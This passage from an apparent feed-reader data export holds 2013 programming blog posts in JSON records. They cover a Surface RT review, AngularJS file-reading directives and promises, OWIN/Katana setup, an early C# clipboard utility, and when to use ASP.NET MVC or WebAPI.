power consumption, but I'll believe that when I see it.<li>The hardware design is beyond reproach; I'd even argue it's <i>better</i> than Apple quality hardware design. Unless you're required by God to hate all things touched by Microsoft, There's no way you could handle a Surface and not think that this is a genuinely well made <i>thing</i>.<li>The default Surface mail application is an embarrassment and everyone associated with it should be fired. Android and iOS both have decent default mail apps, as well they should, because email is bedrock. Not having this right really hurts. If Microsoft doesn't get their A Team \"hey dummies, all you have to do is just copy Sparrow already\" team on that soon, they'll be sorry.<li>Many of the native applications currently available run poorly on Surface RT due to lack of optimization and testing for the ARM platform versus x86. Probably not terribly different from the iPad 1 on launch day, but it remains to be seen how quickly that will get resolved.<li>The web browser is stellar and a model of how the Internet should work on a tablet. You are almost always in fullscreen mode, swiping around with nothing but content on your screen, the way it should be. However, back button performance is bizarrely slow, and the way IE10 handles web hovers is poor, much worse than Mobile Safari and Chrome. Try upvoting a comment on Stack Overflow to see what I mean.</ul></p><p>Notice how the 2010 iPad 1 is already obsolete? Expect the same thing with the <a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\">Surface RT</a>. It's a fascinating glimpse into the future, but it'll be totally utterly obsolete in 2 years. Do not buy this device expecting longevity. Buy it because you want to see tomorrow today.</p><p>The received wisdom about touchscreen interaction with computers was that <a href=\"http://www.wired.com/gadgetlab/2010/10/gorilla-arm-multitouch/\">it didn't work</a>. That you'd get \"gorilla arm\". That's why we had to have special tablet devices. But <b>Surface proves that's not true; typing and touching are <i>spectacularly</i> compatible, at least for laptops.</b> And I'm beginning to wonder about my desktop a little, because lately I'm starting to I think I wanna touch that, too.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] How are you showing off your awesome? Create a <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">Stack Overflow Careers profile</a> and show off all of your hard work from Stack Overflow, Github, and virtually every other coding site. Who knows, you might even get recruited for a great <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">new position</a>!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1030}}
{"k":"0000000084","o":"0000002569","v":"001"}
{"_id":1031,"_uid":1031,"_dt":1373742504144,"_s":"fa75320ec140c9e02c6d92fc74e64756"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/11/looking-back-python.aspx","title":"Looking Back: Python","published":{"$wrap":"$date","v":1373533920000,"h":"2013-07-11T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><img title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; margin: 0px 0px 0px 10px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"Rabbints, Campfires, Python\" align=\"right\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Looking-Back-Python_10B8B/Fire_Rabbit2_3.jpg\" width=\"125\" height=\"119\">True story: My first use of Python was a little over 10 years ago.  I used Python to prevent rabbits from running into campfires and injuring themselves.</p><p>Of course the rabbits were virtual, as were the campfires. I was working with a team to create MMORPG middleware, and Python scripts were the brains for some of the lesser NPCs.</p><p>I’ve been working with Python again recently.</p><pre class=\"brush: py; gutter: false; toolbar: false;\">class Cart:def __init__(self):self.contents = dict()def process(self, order):if order.add:if not order.item in self.contents:self.contents[order.item] = 0self.contents[order.item] += 1if order.delete:if order.item in self.contents:self.contents[order.item] -= 1if self.contents[order.item] == 0:del self.contents[order.item]def __repr__(self):return \"Cart: {0!r}\".format(self.__dict__)</pre><p>It’s interesting how my opinion of Python has changed. Ten years ago the majority of my programming experience was with C, C++, and Java. My thoughts on Python were:</p><p>1. Using indentations to control block structure was weird, considering white space was insignificant everywhere else.</p><p>2. Tuples were useful.</p><p>3.  Double underscores look cool</p><p>Todays thoughts:</p><p>1. Tuples are still useful, but the REPL perhaps more so.</p><p>2. How did I miss lambdas, generators, map, filter, and reduce?</p><p>3. Double underscores are ugly, but the absence of { and } and is beautiful.</p><p>I like Python, it’s a great language. I have a better appreciation for its features today than I did 10 years ago.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=jFi9Fnbt2Oo:Hbfw58piRr4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1031}}
{"k":"0000000084","o":"0000003366","v":"001"}
{"_id":1032,"_uid":1032,"_dt":1373742504145,"_s":"bb38b42eb818f43285af96a149139c37"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/10/angularjs-drag-and-drop-photo-directive.aspx","title":"AngularJS Drag and Drop Photo Directive","published":{"$wrap":"$date","v":1373447520000,"h":"2013-07-10T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><img style=\"float: right; display: inline\" align=\"right\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Angular-Abstractions-The-Application_F661/image_3.png\">Continuing from previous posts on building a<a href=\"http://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx\">file input directive</a>and a<a href=\"http://odetocode.com/blogs/scott/archive/2013/07/03/building-a-filereader-service-for-angularjs-the-service.aspx\">file reader service</a>, this post contains my first try at a drag-n-drop directive that uses the file reader service to copy an image dropped from the desktop into an img element.</p><p>As always, I welcome suggestions!</p><p>Native HTML 5 drag-and-drop is easy to work with. The directive handles the dragover, dragleave, and drop events on the target element. Dragover and dragleave are mostly about manipulating classes on the element to style it as a droppable target, as well as using e.preventDefault(), which is required for the drop event to work.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">module.directive(\"imageDrop\",function ($parse, fileReader, resampler) {return {restrict: \"EA\",link: function (scope, element, attrs) {var expression = attrs.imageDrop;var accesor = $parse(expression);var onDragOver = function (e) {e.preventDefault();element.addClass(\"dragOver\");};var onDragEnd = function (e) {e.preventDefault();element.removeClass(\"dragOver\");};var placeImage = function (imageData) {accesor.assign(scope, imageData);};var resampleImage = function (imageData) {return resampler.resample(imageData, element.width(),element.height(), scope);};var loadFile = function (file) {fileReader.readAsDataUrl(file, scope).then(resampleImage).then(placeImage);};element.bind(\"dragover\", onDragOver).bind(\"dragleave\", onDragEnd).bind(\"drop\", function (e) {onDragEnd(e);loadFile(e.originalEvent.dataTransfer.files[0]);});scope.$watch(expression, function () {element.attr(\"src\", accesor(scope));});}};});</pre><p>Some of the code to ensure only images are being processed is omitted, but I do want to point out the  image resizing code. It’s wrapped by the resampler service below, which in turn uses Resampler.js from the post “<a href=\"http://webreflection.blogspot.com/2010/12/100-client-side-image-resizing.html\">100% Client Side Image Resizing</a>”.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var resampler = function ($q) {var resample = function (imageData, width, height, scope) {var deferred = $q.defer();Resample(imageData, width, height, function (result) {scope.$apply(function () {deferred.resolve(result);});});return deferred.promise;};return {resample: resample};};module.factory(\"resampler\", resampler);</pre><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=120hiIgwVng:94e8c14D1lI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1032}}
{"k":"0000000084","o":"0000003969","v":"001"}
{"_id":1033,"_uid":1033,"_dt":1373742504145,"_s":"0fbf7c7392c51436ad474fb4c5dd9415"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/09/getting-started-with-owin-katana-and-vs2013.aspx","title":"Getting Started With OWIN, Katana, and VS2013","published":{"$wrap":"$date","v":1373361120000,"h":"2013-07-09T09:12:00.000Z"},"starred":false,"read":false,"content":"<p>If you start almost any new ASP.NET project in the new preview of<a href=\"http://www.microsoft.com/visualstudio/eng/2013-downloads\">Visual Studio 2013</a>, you’ll find a reference to the Owin package inside. OWIN (the<a href=\"http://owin.org/\">Open Web Interface for .NET</a>) is a specification designed to decouple web servers from the frameworks and applications they host. The OWIN goal is to provide a lightweight, modular, and portable platform for mixing and matching components, frameworks, and servers.</p><p>Katana is Microsoft’s implementation of OWIN components. The code is available on<a href=\"http://katanaproject.codeplex.com/\">CodePlex</a>. </p><p>In a future post we can talk about how OWIN compares to System.Web, but first let’s get a simple example up and running from scratch.</p><p>In VS2013 you can start a new console mode application, then run the following commands in the package manager console:</p><pre class=\"brush: plain; gutter: false; toolbar: false;\">install-package Microsoft.Owin.Hosting -IncludePreReleaseinstall-package Microsoft.Owin.Host.HttpListener –IncludePreReleaseinstall-package Microsoft.Owin.Diagnostics –IncludePreReleaseinstall-Package Owin.Extensions -IncludePrerelease</pre><p>Inside the<em>Main</em>entry point for the console application, we can use the<em>WebApp</em>class to start an HTTP listener.</p><pre class=\"brush: csharp; gutter: false; toolbar: false;\">static void Main(string[] args){string uri = \"http://localhost:8080/\";using (WebApp.Start&lt;Startup&gt;(uri)){Console.WriteLine(\"Started\");Console.ReadKey();Console.WriteLine(\"Stopping\");}}</pre><p>The<em>Startup</em>class used as the generic type parameter to<em>WebApp.Start</em>is a class we’ll have to implement, too.</p><pre class=\"brush: csharp; gutter: false; toolbar: false;\">public class Startup{public void Configuration(IAppBuilder app){app.UseWelcomePage();}}</pre><p>IAppBuilder is an interface we can use to compose the application for Katana to host. In this setup we’ll invoke the UseWelcomePage extension method provided by Microsoft.Owin.Diagnostics. Running the console program and pointing a browser to http://localhost:8080 produces:</p><p><img title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"katana up and running\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Web-Development-With-Visual-Studio-2013-_132E6/katana_3.png\" width=\"745\" height=\"413\"></p><p>Other extension methods allow for more fine grained control over the request and response processing. For example,<em>UseHandlerAsync</em>from Owin.Extensions allows for a more traditional “Hello, World” response to every request.</p><pre class=\"brush: csharp; gutter: false; toolbar: false;\">public class Startup{public void Configuration(IAppBuilder app){app.UseHandlerAsync((req, res) =&gt;{res.ContentType = \"text/plain\";return res.WriteAsync(\"Hello, World!\");});}}</pre><p>So far this doesn’t appear much different than self-hosting WebAPI in a console application, but in some future posts we’ll dig a little deeper into some examples showing the loftier goals of OWIN and Katana.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=55p4ZP1TfE0:RYFo1kAxkNs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1033}}
{"k":"0000000084","o":"0000002872","v":"001"}
{"_id":1034,"_uid":1034,"_dt":1373742504145,"_s":"d23f3628040b6a9e07ab94f91fa0ef14"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/08/looking-backndash-my-first-c-program.aspx","title":"Looking Back: My First C# Program","published":{"$wrap":"$date","v":1373274720000,"h":"2013-07-08T09:12:00.000Z"},"starred":false,"read":false,"content":"<p>While digging through some directories of archived source code I found the first program I ever wrote in C#.</p><p>I’m not sure when I wrote this, but since there was a makefile in the directory I’m guessing this was still in the .NET 1.0 beta days of late 2000.</p><pre class=\"brush: csharp; gutter: false; toolbar: false;\">/******************************************************************************CLIPBOARD.CSBased on the code and idea in Bill Wagner's VCDJ Fundamentals column.This program takes piped input or a filename argument and copies all stream datato the clipboard.Examples:dir | clipboardclipboard clipboard.cs******************************************************************************/using System;using System.IO;using System.WinForms;class MainApp{public static void Main( string[] args ){// The clipboard class uses COM interop. I figured this out because// calls to put data in the clipboard always failed and further// investigation showed a failed hresult indicating no CoInitialize.// Here is the .NET equivalent:Application.OLERequired();TextReader textReader;if (args.Length == 0){// take the piped input from stdintextReader = System.Console.In;}else{// open the text file specified on command lineFile file = new File(args[0]);textReader = file.OpenText();}string line;string allText = \"\";Boolean pipeFull = true;while(pipeFull){try{// When the pipe is empty, ReadLine throws an exception// instead of the documented \"return a null string\" behavior.// When reading from a file a null string is returned.line = textReader.ReadLine();if( line == null ){pipeFull = false;}else{allText += line;allText += \"\\r\\n\";}}catch(System.IO.IOException ex){if(ex.Message == \"The pipe has been ended\"){pipeFull = false;}else{throw ex;}}}Clipboard.SetDataObject(allText, true);}}</pre><p>The first thoughts that came to mind when seeing this code again were:</p><p>1) Wow, that’s a<em>long</em>function by today’s standards.</p><p>2) I could use this!</p><p>Before resharpering the program into shape, I did a quick search and discovered Windows now<a href=\"http://blogs.msdn.com/b/oldnewthing/archive/2009/11/10/9919908.aspx\">comes with such a program by default</a>. It’s called<em>clip</em>. I guess I can leave the code in the archive.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=YliXi690oNo:WxcLGRvxX5Y:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1034}}
{"k":"0000000084","o":"0000003569","v":"001"}
{"_id":1035,"_uid":1035,"_dt":1373742504146,"_s":"14effc8ab3c7039f353aa2c4347bc4d9"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx","title":"A File Input Directive For AngularJS","published":{"$wrap":"$date","v":1373015520000,"h":"2013-07-05T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><img style=\"float: right; margin: 0px 0px 5px 5px; display: inline;\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Angular-Abstractions-The-Application_F661/image_3.png\" alt=\"\" align=\"right\" />Now that we<a href=\"http://odetocode.com/blogs/scott/archive/2013/07/03/building-a-filereader-service-for-angularjs-the-service.aspx\">have a FileReader service</a>for AngularJS, we need something that will give us a file to read. The two ways for users to select files are to use&lt;input type=’file’&gt;,  or to drag and drop a file into the browser.</p><p>We’ll build a directive for the file input this week, and look at drag and drop next week.</p><p>But first, why are we using a directive?</p><p>As discussed<a href=\"http://odetocode.com/blogs/scott/archive/2013/05/28/angularjs-abstractions-directives.aspx\">before</a>, directives are where the DOM and your Angular code can all come together. Directives can manipulate the DOM, listen for events in the DOM, and move data between the  model and the view. For simple directives, most of the work is in the<em>link</em>function of the directive. Inside of link you’ll have access to your associated DOM element and the current scope. The DOM element is wrapped in<a href=\"http://docs.angularjs.org/api/angular.element\">jQuery lite</a>(unless you are using jQuery, then it will be wrapped with jQuery), so you can wire up events on the element, change its classes, set its text, its HTML, and so on.</p><p>In our fileInput directive, the most important DOM operation is to wire up the change event.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var fileInput = function ($parse) {return {restrict: \"EA\",template: \"&lt;input type='file' /&gt;\",replace: true,link: function (scope, element, attrs) {var modelGet = $parse(attrs.fileInput);var modelSet = modelGet.assign;var onChange = $parse(attrs.onChange);var updateModel = function () {scope.$apply(function () {modelSet(scope, element[0].files[0]);onChange(scope);});};element.bind('change', updateModel);}};};</pre><p>The rest of the code in the<em>link</em>function is moving a selected file into the model.  This directive assumes there will be a single file. The directive can also fire off an onChange expression set in the HTML. Most of this work is easy because the $parse service in Angular can essentially turn HTML attribute values into executable code.</p><p>Using the directive in markup is easy:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;div file-input=\"file\" on-change=\"readFile()\"&gt;&lt;/div&gt;&lt;img ng-src=\"{{imageSrc}}\"/&gt;</pre><p>The associated controller just needs to implement<em>readFile</em>for the code to all work.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.readFile = function () {fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};};</pre><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=2_g_FGSmqwA:JlP_c7rnqhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1035}}
{"k":"0000000084","o":"0000003730","v":"001"}
{"_id":1036,"_uid":1036,"_dt":1373742504146,"_s":"1a91eba68c6bc2dd5ac33d4688bf3b08"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/03/building-a-filereader-service-for-angularjs-the-service.aspx","title":"Building a FileReader Service For AngularJS: The Service","published":{"$wrap":"$date","v":1372842720000,"h":"2013-07-03T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><img style=\"float: right; display: inline;\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Angular-Abstractions-The-Application_F661/image_3.png\" alt=\"\" align=\"right\" />In the<a href=\"http://odetocode.com/blogs/scott/archive/2013/07/02/building-a-filereader-service-for-angularjs-promises-promises.aspx\" target=\"_blank\">previous post</a>we looked at promises in AngularJS both from both the creator and client perspective. Here is an Angular service that wraps the<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\">FileReader</a>and transforms an evented API into a promise API. The<em>onload</em>event resolves a promise, and the<em>onerror</em>event rejects a promise. Notice the use of scope.$apply to propagate the promise results.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">(function (module) {var fileReader = function ($q, $log) {var onLoad = function(reader, deferred, scope) {return function () {scope.$apply(function () {deferred.resolve(reader.result);});};};var onError = function (reader, deferred, scope) {return function () {scope.$apply(function () {deferred.reject(reader.result);});};};var onProgress = function(reader, scope) {return function (event) {scope.$broadcast(\"fileProgress\",{total: event.total,loaded: event.loaded});};};var getReader = function(deferred, scope) {var reader = new FileReader();reader.onload = onLoad(reader, deferred, scope);reader.onerror = onError(reader, deferred, scope);reader.onprogress = onProgress(reader, scope);return reader;};var readAsDataURL = function (file, scope) {var deferred = $q.defer();var reader = getReader(deferred, scope);reader.readAsDataURL(file);return deferred.promise;};return {readAsDataUrl: readAsDataURL};};module.factory(\"fileReader\",[\"$q\", \"$log\", fileReader]);}(angular.module(\"testApp\")));</pre><p>The service only exposes a single method (<em>readAsDataUrl</em>). The rest of the FileReader methods are omitted for brevity, but they follow the same pattern.</p><p>One interesting event is the<em>onprogress</em>event of a FileReader. Since there is nothing to do with the promise during a progress event, the event is instead transformed and forwarded using<em>scope.$broadcast</em>. Other interested parties can use<em>$scope.$on</em>to register event handlers for such broadcasts. For example, here is a controller  using the reader the reader service.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.getFile = function () {$scope.progress = 0;fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};$scope.$on(\"fileProgress\", function(e, progress) {$scope.progress = progress.loaded / progress.total;});};</pre><p>The progress value is fed into a progress element:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;progress value=\"{{progress}}\"&gt;&lt;/progress&gt;</pre><p>But how does a controller know what file to read?</p><p>That’s where we can build some file input and drag and drop directives...</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=XLrz9B_AfzE:PpuPyUB7Z-M:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1036}}
{"k":"0000000084","o":"0000007483","v":"001"}
{"_id":1037,"_uid":1037,"_dt":1373742504147,"_s":"b3f5919b82960d909f1221a8237c0921"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/02/building-a-filereader-service-for-angularjs-promises-promises.aspx","title":"Building a FileReader Service For AngularJS: Promises, Promises","published":{"$wrap":"$date","v":1372756320000,"h":"2013-07-02T09:12:00.000Z"},"starred":false,"read":false,"content":"<p><img style=\"float: right; display: inline;\" src=\"http://odetocode.com/images2/Windows-Live-Writer/Angular-Abstractions-The-Application_F661/image_3.png\" alt=\"\" align=\"right\" />Let’s build an AngularJS service to wrap an HTML 5<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\" target=\"_blank\">FileReader</a>object.</p><p>The first question a curious person might ask is: why create a service? Why not use a FileReader directly from the code in a model or controller?</p><p>Here are two reasons:</p><p>1) To build an adapter around FileReader that works with promises instead of call back functions (which is what this post will focus on).</p><p>2) To achieve greater flexibility. Services in AngularJS can be decorated or replaced at runtime.</p><p>To understand the advantages of #1, we’ll need to learn about promises in AngularJS. For more general information about promises, see“<a href=\"http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/\" target=\"_blank\">What’s so great about JavaScript Promises</a>”.</p><h3>Promises and $q</h3><p>In Angular, $q is the well known name of a promise provider, meaning you can use $q to create new promises. Here’s some code for a simple service that will perform async operations. The service requires $q as a dependency.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">(function(module) {var slowService = function ($q) {var doWork = function () {var deferred = $q.defer();// asynch work will go herereturn deferred.promise;};return {doWork: doWork};};module.factory(\"slowService\",[\"$q\", slowService]);}(angular.module(\"testApp\")));</pre><p>The<em>doWork</em>function uses<em>$q.defer</em>to create a a deferred object that represents the outstanding work for the service to complete. The function returns the deferred object’s<em>promise</em>property, which will give the caller an API for figuring out when the work is complete. This is the basic pattern most async services will use, but in order for anything interesting to happen with the promise, the service will also need to resolve or reject the promise when the async work is complete. Here is a new version of the<em>doWork</em>function .</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var doWork = function (value, scope) {var deferred = $q.defer();setTimeout(function() {scope.$apply(function() {if (value === \"bad\") {deferred.reject(\"Bad call\");} else {deferred.resolve(value);}});}, 2000);return deferred.promise;};</pre><p>This version is using<em>setTimeout</em>to simulate work that takes 2000 milliseconds to complete. Normally you’d want to use the Angular $timeout service instead of setTimeout, but setTimeout is here to illustrate an important point.</p><p><strong>AngularJS promises do not propagate the result of a completed promise until the next digest cycle</strong>.</p><p>This means there has to be a call to<em>scope.$apply</em>(which will kick off a digest cycle) for the promise holder to have their callback functions invoked. With the $timeout service we wouldn’t need to use<em>$scope.apply</em>ourselves since the $timeout service will call into our code using<em>$apply</em>, but most things you’ll wrap with a service are not Angularized, so you’ll need to use<em>$apply</em>when resolving a promise.</p><h3>Promises From The Client Perspective</h3><p>Promises can lead to readable code for the client, as the code in the bottom of the controller demonstrates.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var callComplete = function (result) {$scope.serviceResult = result;};var callFailed = function(reason) {$scope.serviceResult = \"Failed: \" + reason;};var logCall = function() {$log.log(\"Service call completed\");};$scope.serviceResult = \"\";slowService.doWork(\"Hello!\", $scope).then(callComplete, callFailed).always(logCall);};</pre><p>One interesting feature of AngularJS is how the data-binding infrastructure understands how to work with promises. If all you want to do is assign the resolved value to a variable for data-binding, then you can assign the variable a promise instead of using a callback and Angular will know how to pick up the resolved value and update the view.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">$scope.serviceResult =slowService.doWork(\"Hello!\", $scope).always(logCall);</pre><p>And of course chained promises can kick off new async operations and the runtime will work through the promises in a serial fashion.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var saveResult = function (result) {$scope.callResults.push(result);};$scope.callResults = [];slowService.doWork(\"Hello\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult);};</pre><p>With the above code and this bit of markup:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;li ng-repeat=\"result in callResults\"&gt;{{ result }}&lt;/li&gt;</pre><p>... then“World” appears on the screen roughly 2 seconds after“Hello”.</p><p>It’s interesting to note in the last example that if the first call fails, the 2nd call never happens (because the 2nd call is started from an“on success” function). If you want to know that the call failed you don’t have to add an error callback to every<em>.then</em>invocation.  A rejected promise will tunnel it’s way through the rest of the chain invoking error call backs as it goes, meaning you could get away with an error callback in the final .<em>then</em>.</p><p>For example, the following chained operations are doomed to failure since the service will reject the initial call with a parameter of“bad”.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">slowService.doWork(\"bad\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult, logFailure);</pre><p>Even though the error handler<em>logFailure</em>doesn’t appear till the end of the chain, the initial failed service call will find it and the 2nd service is skipped.</p><p>In addition to serial processing, you can kick off multiple promises and wait for them to complete using $q.all.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var promises = [];var parameters = [\"Hello\", \"World\", \"Final Call\"];angular.forEach(parameters, function(parameter) {var promise = slowService.doWork(parameter, $scope).then(saveResult);promises.push(promise);});$q.all(promises).then(function() {$scope.message = \"All calls complete!\";});</pre><p>Now that we know a little more about promises, we can move on to the business of building a service in the next post.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=iNMHRkSs5u8:UV2GmjRX2d0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1037}}
{"k":"0000000084","o":"0000005647","v":"001"}
{"_id":1038,"_uid":1038,"_dt":1373742504549,"_s":"e18eeba067902cab50456086c906f562"}
{"subscription":{"$wrap":"$oid","v":29},"link":"http://odetocode.com/blogs/scott/archive/2013/07/01/on-the-coexistence-of-asp-net-mvc-and-webapi.aspx","title":"On The Coexistence of ASP.NET MVC and WebAPI","published":{"$wrap":"$date","v":1372669920000,"h":"2013-07-01T09:12:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve gotten more than a few questions over the last year on how to use the ASP.NET MVC framework and the Web API framework together. Do they work together? Should they work together? When should you use one or the other?</p><p>Here’s some general rules of thumb I use.</p><p><strong>1.</strong>If the bulk of the application is generating HTML on the server, then there is no need to use the Web API. Even if I have the occasional call from JavaScript to get JSON data for templates or an autocomplete widget, using regular MVC controllers will suffice.</p><p><img title=\"Figure 1\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"All ASP.NET MVC\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure1_3.png\" width=\"229\" height=\"207\"></p><p>One thing to keep in mind is that the Web API is a separate framework with its own dependency resolver, action filters, routing rules, model binding, and model serialization settings. Bringing in a 2nd set of all these components just to satisfy a few JSON requests from script is an increase in complexity.</p><p><strong>2.</strong>If an application is loaded with JavaScripts and JSON flows back and forth to the server frequently, or if I have to support more clients than just the script in the pages from my site (some of whom might want XML or other formats), then it is a good time to create HTTP service endpoints and a more formal service API. These scenarios are just what Web API is made for and both MVC controllers and Web API controllers will happily coexist in the same project.</p><p><img title=\"Figure 2\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"MVC With Web API\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure2_3.png\" width=\"391\" height=\"213\"></p><p>Although the Web API does add some complexity, it is also easier to build a proper service with the Web API. I can use the verb based routing and content negotiation features to build services oriented around resources, and the OData support and automatic help page generation of the Web API framework can come in handy.</p><p><strong>3</strong>. I’m not a big fan of services for services sake. In the previous two figures, the MVC UI and Web API pieces are drawn to suggest how they are only facades on top of a core application. Most of the interesting things are defined in the application and not in the UI and Web API layers. When someone suggests that the MVC controllers should talk over HTTP to Web API controllers in the same application, all I can think about is putting a façade over a façade, which seems silly.</p><p> </p><p><img title=\"Figure 3\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Tears for tiers\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure3_3.png\" width=\"352\" height=\"278\"></p><p>There are some valid reasons to go with such an architecture (see #4), but be cautious when creating new tiers.</p><p><strong>4</strong>. It is more than reasonable to integrate multiple applications or large pieces of functionality using services and the Web API. This is a scenario where having web service calls inside or behind the MVC controllers of an application is almost required.</p><p><img title=\"Figure 4\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Big Enterprise\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure4_3.png\" width=\"627\" height=\"368\"></p><p>The above type of scenario usually involves large applications and multiple teams. Using a service layer allows for more flexibility and scale compared to sharing binaries, or integrating at the database level (shudder with fear).</p><h3>Parting Words</h3><p>There is no quick and easy answer to the questions in this space. If you are looking for guidance, hopefully I’ve provided some rules of thumb you can use to start thinking about the answer for your specific scenario. While thinking, remember these lines from the<a href=\"http://www.python.org/dev/peps/pep-0020/\" target=\"_blank\">Zen of Python</a>:</p><blockquote><p>Simple is better than complex</p><p>Complex is better than complicated</p></blockquote><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=yKFLn42py4o:TsT6RtkywMI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" 